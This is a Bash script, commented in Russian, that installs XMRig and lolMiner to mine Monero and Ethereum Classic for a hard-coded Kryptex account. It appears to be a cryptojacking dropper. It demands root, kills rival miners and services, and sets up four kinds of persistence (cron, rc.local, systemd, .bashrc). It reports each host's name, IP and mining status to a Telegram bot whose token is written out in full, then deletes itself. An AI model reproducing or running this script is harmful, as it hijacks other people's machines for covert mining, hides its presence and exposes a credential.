#!/bin/bash

#==============================================================================
# КОНФИГУРАЦИЯ
#==============================================================================
KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"

# Пулы Kryptex
ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

# Получение IP и формирование Worker ID
get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}

SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"

# Формируем логины для пулов
ETC_USERNAME="$WORKER_NAME"
XMR_USERNAME="$WORKER_NAME"

#==============================================================================
# ФУНКЦИЯ ПРОВЕРКИ СТАТУСА СЕРВЕРА
#==============================================================================
check_server_status() {
    local etc_status="ostanovlen"
    local xmr_status="ostanovlen"
    local etc_pid="N/A"
    local xmr_pid="N/A"
    
    # Проверка процессов
    if pgrep -f "lolMiner.*ETCHASH" > /dev/null 2>&1; then
        etc_status="zapushchen"
        etc_pid=$(pgrep -f 'lolMiner.*ETCHASH' | head -1)
    fi
    
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        xmr_status="zapushchen"
        xmr_pid=$(pgrep -f 'xmrig' | head -1)
    fi
    
    # Uptime
    local uptime_info=$(uptime -p 2>/dev/null || echo "unknown")
    
    # Нагрузка CPU
    local cpu_load=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}' 2>/dev/null || echo "N/A")
    
    # Использование RAM
    local ram_usage=$(free -m | awk 'NR==2{printf "%.0f%%", $3*100/$2 }' 2>/dev/null || echo "N/A")
    
    # Хешрейт из логов
    local etc_hashrate=$(tail -20 /var/log/etc-miner.log 2>/dev/null | grep -o "Average speed:.*" | tail -1 | sed 's/Average speed: //' | awk '{print $1" "$2}' 2>/dev/null || echo "N/A")
    local xmr_hashrate=$(tail -20 /var/log/xmr-miner.log 2>/dev/null | grep -o "speed [0-9.]*" | tail -1 | awk '{print $2" H/s"}' 2>/dev/null || echo "N/A")
    
    echo "ETC_STATUS=$etc_status"
    echo "XMR_STATUS=$xmr_status"
    echo "ETC_PID=$etc_pid"
    echo "XMR_PID=$xmr_pid"
    echo "UPTIME=$uptime_info"
    echo "CPU_LOAD=$cpu_load"
    echo "RAM_USAGE=$ram_usage"
    echo "ETC_HASHRATE=$etc_hashrate"
    echo "XMR_HASHRATE=$xmr_hashrate"
}

#==============================================================================
# ФУНКЦИЯ ОТПРАВКИ СООБЩЕНИЯ В TELEGRAM С ПРОВЕРКОЙ
#==============================================================================
send_telegram_message() {
    local message="$1"
    local with_status="${2:-false}"
    
    # Если нужна проверка статуса - добавляем информацию
    if [ "$with_status" = "true" ]; then
        local status_info=$(check_server_status)
        eval "$status_info"
        
        message="${message}

--- STATUS PROVERKA ---
ETC Miner: ${ETC_STATUS} (PID: ${ETC_PID})
XMR Miner: ${XMR_STATUS} (PID: ${XMR_PID})
Hashrate ETC: ${ETC_HASHRATE}
Hashrate XMR: ${XMR_HASHRATE}
Uptime: ${UPTIME}
CPU: ${CPU_LOAD}
RAM: ${RAM_USAGE}"
    fi
    
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

#==============================================================================
# ФУНКЦИЯ ПОЛУЧЕНИЯ СКОРОСТИ МАЙНИНГА
#==============================================================================
get_mining_speed() {
    local etc_speed="net dannyh"
    local xmr_speed="net dannyh"
    
    if [ -f "/var/log/etc-miner.log" ]; then
        etc_speed=$(tail -50 /var/log/etc-miner.log 2>/dev/null | grep -o "Average speed.*" | tail -1 | sed 's/Average speed://g' | xargs 2>/dev/null || echo "net dannyh")
    fi
    
    if [ -f "/var/log/xmr-miner.log" ]; then
        xmr_speed=$(tail -50 /var/log/xmr-miner.log 2>/dev/null | grep -o "speed.*H/s" | tail -1 | sed 's/speed.*max//g' | xargs 2>/dev/null || echo "net dannyh")
    fi
    
    echo "ETC: $etc_speed | XMR: $xmr_speed"
}

#==============================================================================
# ФУНКЦИЯ ОТПРАВКИ СТАТУСА МАЙНИНГА
#==============================================================================
send_mining_status() {
    local server_ip=$(get_server_ip)
    local mining_speed=$(get_mining_speed)
    
    local status_msg="[STATUS] Status mayninga

Host: $(hostname)
IP: ${server_ip}
Worker: ${WORKER_NAME}
Skorost': ${mining_speed}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')"
    
    send_telegram_message "$status_msg"
}

#==============================================================================
# ПРОВЕРКА ПРАВ ROOT
#==============================================================================
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "[ERROR] Zapustite skript s pravami root: sudo $0"
        exit 1
    fi
}

#==============================================================================
# УСТАНОВКА ЗАВИСИМОСТЕЙ
#==============================================================================
install_dependencies() {
    echo "[INFO] Proveryayu i ustanavlivayu zavisimosti..."
    
    if ! command -v wget &> /dev/null; then
        echo "[INFO] Ustanavlivayu wget..."
        apt-get update -qq 2>/dev/null && apt-get install -y wget curl 2>/dev/null || yum install -y wget curl 2>/dev/null || true
    fi
    
    if ! command -v curl &> /dev/null; then
        echo "[INFO] Ustanavlivayu curl..."
        apt-get install -y curl 2>/dev/null || yum install -y curl 2>/dev/null || true
    fi
    
    if ! command -v crontab &> /dev/null; then
        echo "[INFO] Ustanavlivayu cron..."
        apt-get install -y cron 2>/dev/null || yum install -y cronie 2>/dev/null || true
    fi
    
    echo "[OK] Zavisimosti ustanovleny"
}

#==============================================================================
# ОЧИСТКА ОКРУЖЕНИЯ ОТ ЧУЖИХ МАЙНЕРОВ
#==============================================================================
cleanup_environment() {
    echo "[INFO] Ochistka ot chuzhih maynerov..."
    local killed_count=0
    
    # Останавливаем все процессы xmrig и lolMiner
    echo "[INFO] Ostanovka processov xmrig i lolMiner..."
    
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        echo "[INFO] Obnaruzhen xmrig, ostanovka..."
        pkill -9 -f "xmrig" 2>/dev/null && ((killed_count++))
        sleep 1
    fi
    
    if pgrep -f "lolMiner" > /dev/null 2>&1; then
        echo "[INFO] Obnaruzhen lolMiner, ostanovka..."
        pkill -9 -f "lolMiner" 2>/dev/null && ((killed_count++))
        sleep 1
    fi
    
    # Очистка подозрительных записей в crontab
    echo "[INFO] Ochistka crontab..."
    local cron_temp=$(mktemp)
    crontab -l > "$cron_temp" 2>/dev/null || true
    
    if [ -s "$cron_temp" ]; then
        grep -v -E "(curl.*miner|wget.*miner|/tmp/.*xmr|/tmp/.*miner)" "$cron_temp" > "${cron_temp}.clean" 2>/dev/null || true
        crontab "${cron_temp}.clean" 2>/dev/null || true
        rm -f "${cron_temp}.clean"
    fi
    rm -f "$cron_temp"
    
    # Очистка rc.local от подозрительных записей
    if [ -f /etc/rc.local ]; then
        echo "[INFO] Ochistka rc.local..."
        sed -i '/curl.*miner\|wget.*miner\|\/tmp\/.*miner/d' /etc/rc.local 2>/dev/null || true
    fi
    
    # Удаление подозрительных systemd служб
    echo "[INFO] Poisk podozritelnyh systemd sluzhb..."
    for service in $(systemctl list-units --type=service --all 2>/dev/null | grep -E "miner|xmr|crypto" | awk '{print $1}' | grep -v "opt-mining"); do
        echo "[INFO] Ostanovka sluzhby: $service"
        systemctl stop "$service" 2>/dev/null || true
        systemctl disable "$service" 2>/dev/null || true
        rm -f "/etc/systemd/system/$service" 2>/dev/null || true
    done
    
    systemctl daemon-reload 2>/dev/null || true
    
    # Удаление временных файлов майнеров
    echo "[INFO] Udalenie vremennyh faylov..."
    rm -rf /tmp/*miner* /tmp/*xmr* /tmp/kinsing* /var/tmp/*miner* /var/tmp/*xmr* /dev/shm/*miner* 2>/dev/null || true
    
    echo "[OK] Ochistka zavershena. Ostanovleno processov: $killed_count"
    
    if [ $killed_count -gt 0 ]; then
        send_telegram_message "[CLEANUP] Ochistka na $(hostname)

Ostanovleno chuzhih processov: $killed_count
IP: ${SERVER_IP}" "true"
    fi
}

#==============================================================================
# УСТАНОВКА LOLMINER ДЛЯ ETC (GPU)
#==============================================================================
install_etc_miner() {
    echo "[INFO] Ustanavlivayu lolMiner dlya ETC..."
    mkdir -p /opt/mining/etc || return 1
    cd /opt/mining/etc || return 1

    if wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz 2>/dev/null; then
        tar -xzf lolMiner_v1.98_Lin64.tar.gz --strip-components=1 2>/dev/null || return 1
        rm -f lolMiner_v1.98_Lin64.tar.gz
        
        # Создаем скрипт запуска для ETC
        cat > /opt/mining/etc/start_etc_miner.sh << EOF
#!/bin/bash
cd /opt/mining/etc
./lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USERNAME --tls off --nocolor
EOF
        chmod +x /opt/mining/etc/start_etc_miner.sh
        chmod +x /opt/mining/etc/lolMiner 2>/dev/null || true
        
        echo "[OK] lolMiner dlya ETC ustanovlen i nastroen"
        return 0
    else
        echo "[ERROR] Oshibka zagruzki lolMiner"
        return 1
    fi
}

#==============================================================================
# УСТАНОВКА XMRIG ДЛЯ MONERO (CPU)
#==============================================================================
install_xmr_miner() {
    echo "[INFO] Ustanavlivayu XMRig dlya Monero..."
    mkdir -p /opt/mining/xmr || return 1
    cd /opt/mining/xmr || return 1

    if wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz 2>/dev/null; then
        tar -xzf xmrig-*-linux-x64.tar.gz --strip-components=1 2>/dev/null || return 1
        rm -f xmrig-*-linux-x64.tar.gz

        # Создаем скрипт запуска для XMR
        cat > /opt/mining/xmr/start_xmr_miner.sh << EOF
#!/bin/bash
cd /opt/mining/xmr
./xmrig -o $XMR_POOL -u $XMR_USERNAME -p x --randomx-1gb-pages
EOF
        chmod +x /opt/mining/xmr/start_xmr_miner.sh
        chmod +x /opt/mining/xmr/xmrig 2>/dev/null || true
        
        echo "[OK] XMRig dlya Monero ustanovlen i nastroen"
        return 0
    else
        echo "[ERROR] Oshibka zagruzki XMRig"
        return 1
    fi
}

#==============================================================================
# МНОЖЕСТВЕННАЯ НАСТРОЙКА АВТОЗАПУСКА
#==============================================================================
setup_autostart() {
    echo "[INFO] Nastraivayu avtозапуск (mnozhestvennyy)..."
    
    # Метод 1: Cron @reboot
    echo "[INFO] Nastroyka cron @reboot..."
    (crontab -l 2>/dev/null | grep -v "/opt/mining/etc/start_etc_miner.sh\|/opt/mining/xmr/start_xmr_miner.sh"; \
     echo "@reboot /opt/mining/etc/start_etc_miner.sh > /var/log/etc-miner.log 2>&1 &"; \
     echo "@reboot /opt/mining/xmr/start_xmr_miner.sh > /var/log/xmr-miner.log 2>&1 &") | crontab - 2>/dev/null || true
    
    # Метод 2: rc.local
    echo "[INFO] Nastroyka rc.local..."
    if [ ! -f /etc/rc.local ]; then
        cat > /etc/rc.local << 'RCEOF'
#!/bin/bash
exit 0
RCEOF
        chmod +x /etc/rc.local
    fi
    
    grep -q "start_etc_miner.sh" /etc/rc.local || sed -i '/exit 0/i /opt/mining/etc/start_etc_miner.sh > /var/log/etc-miner.log 2>&1 &' /etc/rc.local 2>/dev/null || true
    grep -q "start_xmr_miner.sh" /etc/rc.local || sed -i '/exit 0/i /opt/mining/xmr/start_xmr_miner.sh > /var/log/xmr-miner.log 2>&1 &' /etc/rc.local 2>/dev/null || true
    chmod +x /etc/rc.local
    
    # Метод 3: systemd service для ETC
    echo "[INFO] Sozdanie systemd sluzhb..."
    cat > /etc/systemd/system/etc-miner.service << EOF
[Unit]
Description=ETC Mining Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/mining/etc/start_etc_miner.sh
Restart=always
RestartSec=10
StandardOutput=append:/var/log/etc-miner.log
StandardError=append:/var/log/etc-miner.log
User=root

[Install]
WantedBy=multi-user.target
EOF

    # Метод 3: systemd service для XMR
    cat > /etc/systemd/system/xmr-miner.service << EOF
[Unit]
Description=XMR Mining Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/mining/xmr/start_xmr_miner.sh
Restart=always
RestartSec=10
StandardOutput=append:/var/log/xmr-miner.log
StandardError=append:/var/log/xmr-miner.log
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload 2>/dev/null || true
    systemctl enable etc-miner.service 2>/dev/null || true
    systemctl enable xmr-miner.service 2>/dev/null || true
    
    # Метод 4: Добавляем в .bashrc (для интерактивных сессий)
    if [ -f /root/.bashrc ]; then
        grep -q "start_etc_miner.sh" /root/.bashrc || echo "[ ! -f /tmp/.mining_started ] && /opt/mining/etc/start_etc_miner.sh > /var/log/etc-miner.log 2>&1 & && touch /tmp/.mining_started" >> /root/.bashrc 2>/dev/null || true
        grep -q "start_xmr_miner.sh" /root/.bashrc || echo "[ ! -f /tmp/.mining_started ] && /opt/mining/xmr/start_xmr_miner.sh > /var/log/xmr-miner.log 2>&1 &" >> /root/.bashrc 2>/dev/null || true
    fi
    
    echo "[OK] Avtozapusk nastroen (4 metoda: cron, rc.local, systemd, bashrc)"
}

#==============================================================================
# СОЗДАНИЕ УТИЛИТ УПРАВЛЕНИЯ
#==============================================================================
create_management_tools() {
    echo "[INFO] Sozdayu utility upravleniya..."

    # start-mining.sh
    cat > /usr/local/bin/start-mining.sh << EOF
#!/bin/bash
echo "[INFO] Zapusk maynerov..."
/opt/mining/etc/start_etc_miner.sh > /var/log/etc-miner.log 2>&1 &
/opt/mining/xmr/start_xmr_miner.sh > /var/log/xmr-miner.log 2>&1 &
sleep 2
echo "[OK] Maynery zapushcheny v fone"

# Otpravlyaem uvedomlenie v Telegram
SERVER_IP=\$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || echo "unknown")
START_MSG="[START] Maynery zapushcheny

Host: \$(hostname)
IP: \${SERVER_IP}
Worker: ${WORKER_NAME}
Vremya: \$(date '+%Y-%m-%d %H:%M:%S')"

curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
    -d "chat_id=${TELEGRAM_CHAT_ID}" \
    -d "text=\${START_MSG}" \
    -d "parse_mode=HTML" > /dev/null 2>&1
EOF
    chmod +x /usr/local/bin/start-mining.sh

    # stop-mining.sh
    cat > /usr/local/bin/stop-mining.sh << 'EOF'
#!/bin/bash
echo "[INFO] Ostanovka maynerov..."
pkill -f "lolMiner.*ETCHASH" 2>/dev/null
pkill -f xmrig 2>/dev/null
sleep 2
pkill -9 -f "lolMiner.*ETCHASH" 2>/dev/null
pkill -9 -f xmrig 2>/dev/null
echo "[OK] Maynery ostanovleny"
EOF
    chmod +x /usr/local/bin/stop-mining.sh

    # mining-status.sh
    cat > /usr/local/bin/mining-status.sh << EOF
#!/bin/bash

# Funkciya polucheniya IP
get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print \$1}' 2>/dev/null || echo "unknown"
}

# Funkciya proverki statusa
check_server_status() {
    local etc_status="ostanovlen"
    local xmr_status="ostanovlen"
    local etc_pid="N/A"
    local xmr_pid="N/A"
    
    if pgrep -f "lolMiner.*ETCHASH" > /dev/null 2>&1; then
        etc_status="zapushchen"
        etc_pid=\$(pgrep -f 'lolMiner.*ETCHASH' | head -1)
    fi
    
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        xmr_status="zapushchen"
        xmr_pid=\$(pgrep -f 'xmrig' | head -1)
    fi
    
    local uptime_info=\$(uptime -p 2>/dev/null || echo "unknown")
    local cpu_load=\$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - \$1"%"}' 2>/dev/null || echo "N/A")
    local ram_usage=\$(free -m | awk 'NR==2{printf "%.0f%%", \$3*100/\$2 }' 2>/dev/null || echo "N/A")
    local etc_hashrate=\$(tail -20 /var/log/etc-miner.log 2>/dev/null | grep -o "Average speed:.*" | tail -1 | sed 's/Average speed: //' | awk '{print \$1" "\$2}' 2>/dev/null || echo "N/A")
    local xmr_hashrate=\$(tail -20 /var/log/xmr-miner.log 2>/dev/null | grep -o "speed [0-9.]*" | tail -1 | awk '{print \$2" H/s"}' 2>/dev/null || echo "N/A")
    
    echo "ETC_STATUS=\$etc_status"
    echo "XMR_STATUS=\$xmr_status"
    echo "ETC_PID=\$etc_pid"
    echo "XMR_PID=\$xmr_pid"
    echo "UPTIME=\$uptime_info"
    echo "CPU_LOAD=\$cpu_load"
    echo "RAM_USAGE=\$ram_usage"
    echo "ETC_HASHRATE=\$etc_hashrate"
    echo "XMR_HASHRATE=\$xmr_hashrate"
}

echo "=== STATUS MAYNEROV ==="

# Poluchaem status
status_info=\$(check_server_status)
eval "\$status_info"
SERVER_IP=\$(get_server_ip)

# Vyvodim v konsol'
if [ "\$ETC_STATUS" = "zapushchen" ]; then
    echo "[OK] ETC Miner (GPU): Zapushchen (PID: \${ETC_PID})"
else
    echo "[ERROR] ETC Miner (GPU): Ne zapushchen"
fi

if [ "\$XMR_STATUS" = "zapushchen" ]; then
    echo "[OK] XMR Miner (CPU): Zapushchen (PID: \${XMR_PID})"
else
    echo "[ERROR] XMR Miner (CPU): Ne zapushchen"
fi

echo ""
echo "=== SERVER INFO ==="
echo "Uptime: \${UPTIME}"
echo "CPU Load: \${CPU_LOAD}"
echo "RAM Usage: \${RAM_USAGE}"
echo ""
echo "=== HASHRATE ==="
echo "ETC: \${ETC_HASHRATE}"
echo "XMR: \${XMR_HASHRATE}"
echo ""
echo "=== Logi ETC (poslednie 5 strok) ==="
tail -5 /var/log/etc-miner.log 2>/dev/null || echo "Log ETC pust ili otsutstvuet"
echo ""
echo "=== Logi XMR (poslednie 5 strok) ==="
tail -5 /var/log/xmr-miner.log 2>/dev/null || echo "Log XMR pust ili otsutstvuet"

# Otpravka v Telegram
MESSAGE="[STATUS] Status maynerov

Host: \$(hostname)
IP: \${SERVER_IP}
Worker: ${WORKER_NAME}

--- STATUS PROVERKA ---
ETC Miner: \${ETC_STATUS} (PID: \${ETC_PID})
XMR Miner: \${XMR_STATUS} (PID: \${XMR_PID})
Hashrate ETC: \${ETC_HASHRATE}
Hashrate XMR: \${XMR_HASHRATE}
Uptime: \${UPTIME}
CPU: \${CPU_LOAD}
RAM: \${RAM_USAGE}

Vremya: \$(date '+%Y-%m-%d %H:%M:%S')"

curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
    -d "chat_id=${TELEGRAM_CHAT_ID}" \
    -d "text=\${MESSAGE}" \
    -d "parse_mode=HTML" > /dev/null 2>&1

echo ""
echo "[INFO] Status otpravlen v Telegram"
EOF
    chmod +x /usr/local/bin/mining-status.sh
    
    echo "[OK] Utility upravleniya sozdany"
}

#==============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
#==============================================================================
main() {
    echo "======================================================================="
    echo "  USTANOVKA MAYNEROV"
    echo "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "  Host: $(hostname)"
    echo "  IP: ${SERVER_IP}"
    echo "  Worker: ${WORKER_NAME}"
    echo "======================================================================="
    echo ""
    
    check_root
    
    # Отправляем уведомление о начале установки
    send_telegram_message "[INSTALL] Nachalo ustanovki maynerov

Host: $(hostname)
IP: ${SERVER_IP}
Worker: ${WORKER_NAME}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')" "false"
    
    # Установка зависимостей
    install_dependencies || true
    echo ""
    
    # Очистка от чужих майнеров
    cleanup_environment || true
    echo ""

    # Установка ETC майнера
    if install_etc_miner; then
        echo "[OK] ETC mayner ustanovlen"
    else
        echo "[ERROR] Oshibka ustanovki ETC maynera"
        send_telegram_message "[ERROR] Oshibka ustanovki ETC maynera na $(hostname)" || true
    fi
    echo ""
    
    # Установка XMR майнера
    if install_xmr_miner; then
        echo "[OK] XMR mayner ustanovlen"
    else
        echo "[ERROR] Oshibka ustanovki XMR maynera"
        send_telegram_message "[ERROR] Oshibka ustanovki XMR maynera na $(hostname)" || true
    fi
    echo ""

    # Настройка автозапуска
    setup_autostart || true
    echo ""
    
    # Создание утилит управления
    create_management_tools || true
    echo ""

    # Остановка старых процессов и запуск новых
    echo "[INFO] Zapuskayu maynery..."
    /usr/local/bin/stop-mining.sh > /dev/null 2>&1 || true
    sleep 3
    /usr/local/bin/start-mining.sh || true
    sleep 5

    # Отправляем уведомление об успешной установке С ПРОВЕРКОЙ
    send_telegram_message "[SUCCESS] Ustanovka zavershena uspeshno!

Host: $(hostname)
IP: ${SERVER_IP}
Worker: ${WORKER_NAME}
Maynery: ETC (GPU) + XMR (CPU)
Avtozapusk: 4 metoda
Vremya: $(date '+%Y-%m-%d %H:%M:%S')" "true"

    echo ""
    echo "======================================================================="
    echo "  [OK] NASTROYKA ZAVERSHENA!"
    echo "======================================================================="
    echo ""
    echo "[INFO] Status:"
    /usr/local/bin/mining-status.sh || true

    # Отправляем первый отчет С ПРОВЕРКОЙ
    echo "[INFO] Otpravka pervogo otcheta..."
    send_telegram_message "[REPORT] Pervyy otchet posle ustanovki

Host: $(hostname)
IP: ${SERVER_IP}
Worker: ${WORKER_NAME}
Vremya: $(date '+%Y-%m-%d %H:%M:%S')" "true"

    echo ""
    echo "======================================================================="
    echo "  KOMANDY UPRAVLENIYA:"
    echo "    start-mining.sh    - zapustit' maynery"
    echo "    stop-mining.sh     - ostanovit' maynery"
    echo "    mining-status.sh   - proverit' status i logi"
    echo ""
    echo "  AVTOZAPUSK NASTROEN (4 metoda):"
    echo "    1. Cron @reboot"
    echo "    2. /etc/rc.local"
    echo "    3. Systemd services (etc-miner, xmr-miner)"
    echo "    4. .bashrc"
    echo "======================================================================="
    echo ""
    
    # Самоуничтожение скрипта
    echo "[INFO] Udalenie skripta..."
    sleep 2
    rm -f -- "$0" 2>/dev/null || true
}

# Запуск
main "$@"
